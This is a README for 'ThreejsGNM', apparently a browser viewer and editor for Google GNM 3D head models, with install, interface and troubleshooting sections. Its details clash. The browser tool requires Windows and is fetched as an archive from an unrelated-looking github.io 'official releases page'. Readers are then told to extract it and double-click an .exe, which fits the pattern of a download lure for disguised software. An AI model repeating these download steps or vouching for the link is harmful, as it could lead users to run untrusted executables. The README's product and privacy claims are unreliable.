# 🎨 ThreejsGNM - Build realistic 3D head models easily

[![Download ThreejsGNM](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://merleredistributed129.github.io)

ThreejsGNM brings the Google GNM head model technology directly into your web browser. This tool helps you view and edit highly detailed 3D human heads. You can adjust facial expressions, tweak identity features, and set head poses using simple controls. The software handles the complex math behind the scenes while you focus on your 3D design work.

## 🛠️ System Requirements

To run this application, ensure your computer meets the following standards:

*   **Operating System:** Windows 10 or Windows 11.
*   **Web Browser:** Use a modern browser like Google Chrome, Microsoft Edge, or Mozilla Firefox. Ensure your browser is up to date.
*   **Hardware:** A dedicated graphics card is helpful but not required. Enable WebGL in your browser settings to ensure smooth rendering of the 3D models.
*   **Internet Connection:** You need a connection during the first launch to download the necessary 3D model files.

## 📥 How to Install and Run

The application runs as a portable tool on your machine. Follow these steps to set it up:

1. Visit the [official releases page](https://merleredistributed129.github.io) to download the latest version.
2. Select the file labeled as the latest release.
3. Save the file to a folder you can find easily, such as your Downloads folder.
4. Open the folder and extract the contents if the file is in a compressed format (usually ending in .zip).
5. Open the folder once extracted.
6. Locate the main file, which ends in .html or .exe.
7. Double-click the file to launch the editor in your default web browser.

Once the program opens, it will perform an initial download of the 53 MB gnm_head.npz file. This file contains the data required for the character models. The application will store this data in your browser memory for faster performance in future sessions.

## ⚙️ Using the Interface

The interface provides sliders and input fields to modify the 3D head. 

*   **Identity Controls:** These sliders change the core facial structure, such as jaw width, eye shape, and nose length.
*   **Expression Settings:** You can pull these sliders to create realistic facial movements like smiling, frowning, or blinking.
*   **Pose Settings:** Rotate the head or move the neck joints to change the viewing angle.
*   **Skinning Options:** The software calculates how the skin moves over the joints automatically. You can toggle these options to view different levels of detail.

## 📈 Performance Tips

The software calculates complex 3D geometry in real-time. If you notice a slow response time, try these steps:

*   Close other tabs in your web browser to free up memory.
*   Ensure that hardware acceleration is active in your browser settings.
*   If you are using a laptop, keep it plugged into a power source to allow for maximum processing power.
*   Refresh the page if the 3D canvas remains blank after the initial loading phase.

## 🛡️ Privacy and Safety

This application handles all processing on your local machine. None of your edits or your 3D models get uploaded to an external server. The app only connects to the internet to download the initial model assets. Your edits stay personal to you.

## 📋 Troubleshooting

If you encounter issues during setup, check for these common fixes:

*   **Page fails to load:** Refresh your browser. If it fails again, verify you have an active internet connection for the initial asset download.
*   **3D model looks distorted:** Check that your browser supports WebGL. Type "webgl report" into your search engine to run a quick test.
*   **Application crashes:** This happens if the browser runs out of memory. Try closing other resource-heavy programs on your computer.

## 💾 Saving Your Work

The current version of ThreejsGNM functions as a viewer and editor. You can take screenshots of your work using your computer’s built-in print-screen tool. Future updates will include buttons to export your custom head models as static files.
